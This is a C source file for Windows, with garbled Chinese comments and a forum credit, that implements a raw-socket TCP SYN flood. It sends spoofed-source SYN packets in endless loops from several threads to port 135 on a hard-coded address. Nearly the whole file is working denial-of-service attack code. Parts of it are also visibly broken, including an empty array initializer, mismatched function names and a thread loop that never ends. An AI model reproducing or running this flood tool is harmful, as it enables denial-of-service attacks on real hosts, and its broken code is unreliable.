/* 
//�@��:�S�� 
//�ӷ�:�§޳N�׾¡G[url]http://167168.kmip.net[/url] 
// �@�s�޳N�H�����}�R���B�A����̧K�i~~�޳N�û��O�Ĥ@�Ͳ��O! 
// �`�N:�е�������ӷ� 
*/ 
#include "stdafx.h" 
#include <windows.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib,"WS2_32.LIB") 

typedef struct tag_ip_Header//ip���� 
{ 
unsigned char h_verlen;//4��ⳡ���סA�M4��IP������ 
unsigned char tos;//8�������A�� 
unsigned short total_len;//16���`���� 
unsigned short ident;//16��лx 
unsigned short frag_and_flags;//3��лx��]�pSYN,ACK,����) 
unsigned char ttl;//8��ͦs�ɶ� 
unsigned char proto;//8���ĳ 
unsigned short checksum;//ip�ⳡ����M 
unsigned int SourceIP;//���yIP�a�} 
unsigned int DestIP;//������ip�a�} 
}IPHEADER; 

typedef struct tag_tcp_Header 
{ 
USHORT th_sport;//���y�ݤf 
USHORT th_dport;//�����ݤf 
unsigned int th_seq;//32��t�C�� 
unsigned int th_ack;//32��T�{�� 
unsigned char th_lenres;//4�쭺�����סA6��O�d�r 
unsigned char th_flag;//6��лx�� 
USHORT th_win;//16�쵡�f�j�p 
USHORT th_sum;//16�����M 
USHORT th_urp;// 
}TCPHEADER; 

typedef struct tag_tsd_Header 
{ 
unsigned long saddr;//���y�a�} 
unsigned long daddr;//�����a�} 
char mbz;// 
char ptcl;//��ĳ���� 
unsigned short tcpl;//TCP���� 
}TSDHEADER; 

DWORD WINAPI Start(void); 
HANDLE hFind[10]; 

//�p�����M 
USHORT checksum(USHORT *buffer,int size) 
{ 
unsigned long check=0; 
while(size>1) 
{ 
check+=*buffer++; 
size -=sizeof(USHORT); 
} 
if(size) 
{ 
check += *(USHORT*)buffer; 
} 
check = (check >>16) + (check & 0xffff); 
check += (check >>16); 
return (USHORT)(~check); 
} 
//�����u�{ 
DWORD WINAPI Statr(void) 
{ 
SOCKET sock; 
WSADATA WSAData; 
SOCKADDR_IN syn_in; 
IPHEADER ipHeader; 
TCPHEADER tcpHeader; 
TSDHEADER psdHeader; 
const char *addr = "127.0.0.1";//������IP�a�} 
int port = 135;//�n�������ݤf 
if(WSAStartup(MAKEWORD(2,2),&WSAData)) 
{ 
return false; 
} 
if((sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET) 
{ 
return false; 
} 
BOOL flag=true; 
if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag))==SOCKET_ERROR) 
{ 
return false; 
} 
int Time =888; 
if(setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&Time,sizeof(Time))==SOCKET_ERROR) 
{ 
return false; 
} 
syn_in.sin_family = AF_INET; 
syn_in.sin_port = htons(port); 
syn_in.sin_addr.S_un.S_addr = inet_addr(addr); 
while(TRUE) 
{ 
//��RIP���� 
ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
ipHeader.tos=0; 
ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
ipHeader.ident=1; 
ipHeader.frag_and_flags=0; 
ipHeader.ttl=(unsigned char)GetTickCount()%514+620; 
ipHeader.proto=IPPROTO_TCP; 
ipHeader.checksum=0; 
ipHeader.SourceIP=htonl(GetTickCount()*1986); 
ipHeader.DestIP=inet_addr(addr); 
//��RTcp���� 
int SourcePort =GetTickCount()*1986%514; 
tcpHeader.th_dport=htons(port); 
tcpHeader.th_sport=htons(SourcePort); 
tcpHeader.th_seq=htonl(0x12345678); 
tcpHeader.th_ack=0; 
tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
tcpHeader.th_flag=2; 
tcpHeader.th_win=htons(620); 
tcpHeader.th_urp=0; 
tcpHeader.th_sum=0; 
//��RTCP�������Ψӭp��TCP�Y��������M 
psdHeader.saddr=ipHeader.SourceIP; 
psdHeader.daddr=ipHeader.DestIP; 
psdHeader.mbz=0; 
psdHeader.ptcl=IPPROTO_TCP; 
psdHeader.tcpl=htons(sizeof(tcpHeader)); 

//�p�����M 
char SendBuff[100]=; 
memcpy(SendBuff, &psdHeader, sizeof(psdHeader)); 
memcpy(SendBuff+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
tcpHeader.th_sum=checksum((USHORT *)SendBuff,sizeof(psdHeader)+sizeof(tcpHeader)); 
memcpy(SendBuff, &ipHeader, sizeof(ipHeader)); 
memcpy(SendBuff+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 

//�o�e�ƾڥ] 
int Syn=sendto(sock, SendBuff, sizeof(ipHeader)+sizeof(tcpHeader), 0, (struct sockaddr*)&syn_in, sizeof(syn_in)); 
if(Syn==SOCKET_ERROR) 
{ 
return false; 
} 
} 
closesocket(sock); 
WSACleanup(); 
return true; 
} 

int APIENTRY WinMain(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, 
int nCmdShow) 
{ //�Ұʽu�{�A10�A�j�a�i�H�ۤv�� 
for(int i=0;i<10;i++) 
{ 
hFind[i-1]=createThread(NULL,0,(LPTHREAD_START_ROUTINE)Statr,0,0,NULL); 
i--; 
} 
return 0; 
}